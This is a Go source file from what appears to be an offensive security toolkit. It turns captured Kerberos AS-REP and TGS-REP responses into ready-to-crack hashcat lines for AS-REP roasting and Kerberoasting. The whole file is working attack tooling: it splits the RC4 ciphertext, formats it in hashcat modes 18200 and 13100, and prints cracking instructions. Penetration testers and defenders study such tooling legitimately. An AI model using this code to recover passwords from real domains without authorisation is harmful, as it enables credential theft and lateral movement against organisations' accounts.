// SPDX-License-Identifier: AGPL-3.0-or-later

// Package krbroast assembles the hashcat crack line for the two dominant
// offline Kerberos credential attacks, from a captured KDC response:
//
//   - AS-REP roast (hashcat -m 18200): an AS-REP for a user with
//     "do not require Kerberos preauth" set leaks the enc-part encrypted with
//     the user's password-derived key. Line:
//     $krb5asrep$23$user@REALM:checksum$edata
//   - Kerberoast (hashcat -m 13100): a TGS-REP's service ticket enc-part is
//     encrypted with the service account's password-derived key. Line:
//     $krb5tgs$23$*user$REALM$spn*$checksum$edata
//
// kerberos_decode surfaces the pieces (the AS-REP/TGS-REP enc-part, the service
// ticket's enc-part + SPN); this closes the capture→crackable-hash gap by
// emitting the ready-to-crack line, exactly as netntlm_hashcat does for NTLM.
// The RC4 (etype 23) cipher is checksum(16) ‖ edata; that split is what hashcat
// expects. Pure offline transform; no network or device.
//
// # Wrap-vs-native judgement
//
// Native. It reuses the in-tree internal/kerberos AS-REP/TGS-REP + Ticket
// decoder and does a length split + string format. There is nothing to wrap.
//
// # Verifiable / no confidently-wrong output
//
// The line FORMAT is the canonical hashcat one (modes 18200 / 13100); the cipher
// split is anchored to hand-built, spec-conformant AS-REP and TGS-REP DERs with
// known enc-parts (the EncryptedData parse itself is the same one verified
// against an impacket-built Ticket). Only the RC4 (etype 23) roast is emitted —
// AES (etype 17/18) places its checksum differently (modes 19600/19700/18200
// variants) and is reported as not-yet-supported rather than mis-split.
package krbroast

import (
	"encoding/hex"
	"fmt"

	"github.com/xunholy/promptzero/internal/kerberos"
)

// Result is the assembled crack line.
type Result struct {
	Attack      string `json:"attack"`       // "AS-REP roast" / "Kerberoast"
	HashcatMode int    `json:"hashcat_mode"` // 18200 / 13100
	Principal   string `json:"principal,omitempty"`
	SPN         string `json:"spn,omitempty"`
	Realm       string `json:"realm,omitempty"`
	Line        string `json:"crack_line"`
	Note        string `json:"note,omitempty"`
}

// RoastLine decodes an AS-REP / TGS-REP (hex) and emits the hashcat crack line.
func RoastLine(messageHex string) (*Result, error) {
	r, err := kerberos.Decode(messageHex)
	if err != nil {
		return nil, fmt.Errorf("krbroast: %w", err)
	}
	switch r.MessageType {
	case 11: // AS-REP
		return asrepRoast(r)
	case 13: // TGS-REP
		return kerberoast(r)
	default:
		return nil, fmt.Errorf("krbroast: expected an AS-REP (11) or TGS-REP (13), got %s", r.MessageTypeName)
	}
}

func asrepRoast(r *kerberos.Result) (*Result, error) {
	if r.EncPartEType != 23 {
		return nil, fmt.Errorf("krbroast: AS-REP enc-part is etype %d; only RC4 (etype 23, hashcat 18200) is supported", r.EncPartEType)
	}
	chk, edata, err := splitRC4(r.EncPartCipherHex)
	if err != nil {
		return nil, fmt.Errorf("krbroast: AS-REP enc-part: %w", err)
	}
	user, realm := r.ClientName, r.Realm
	return &Result{
		Attack: "AS-REP roast", HashcatMode: 18200, Principal: user, Realm: realm,
		Line: fmt.Sprintf("$krb5asrep$23$%s@%s:%s$%s", user, realm, chk, edata),
		Note: "crack with: hashcat -m 18200 (AS-REP roast; the user had Kerberos pre-auth disabled)",
	}, nil
}

func kerberoast(r *kerberos.Result) (*Result, error) {
	if r.Ticket == nil {
		return nil, fmt.Errorf("krbroast: TGS-REP carries no decodable service ticket")
	}
	if r.Ticket.EncType != 23 {
		return nil, fmt.Errorf("krbroast: service ticket is etype %d; only RC4 (etype 23, hashcat 13100) is supported", r.Ticket.EncType)
	}
	chk, edata, err := splitRC4(r.Ticket.CipherHex)
	if err != nil {
		return nil, fmt.Errorf("krbroast: service ticket enc-part: %w", err)
	}
	user, realm, spn := r.ClientName, r.Realm, r.Ticket.ServiceName
	return &Result{
		Attack: "Kerberoast", HashcatMode: 13100, Principal: user, Realm: realm, SPN: spn,
		Line: fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s", user, realm, spn, chk, edata),
		Note: "crack with: hashcat -m 13100 (Kerberoast; the SPN's service account key)",
	}, nil
}

// splitRC4 splits an RC4 enc-part cipher hex into the 16-byte checksum and the
// remaining edata, as hashcat 18200 / 13100 expect.
func splitRC4(cipherHex string) (checksum, edata string, err error) {
	b, err := hex.DecodeString(cipherHex)
	if err != nil {
		return "", "", fmt.Errorf("cipher is not valid hex: %w", err)
	}
	if len(b) < 16 {
		return "", "", fmt.Errorf("cipher %d bytes — too short for a 16-byte checksum", len(b))
	}
	return hex.EncodeToString(b[:16]), hex.EncodeToString(b[16:]), nil
}
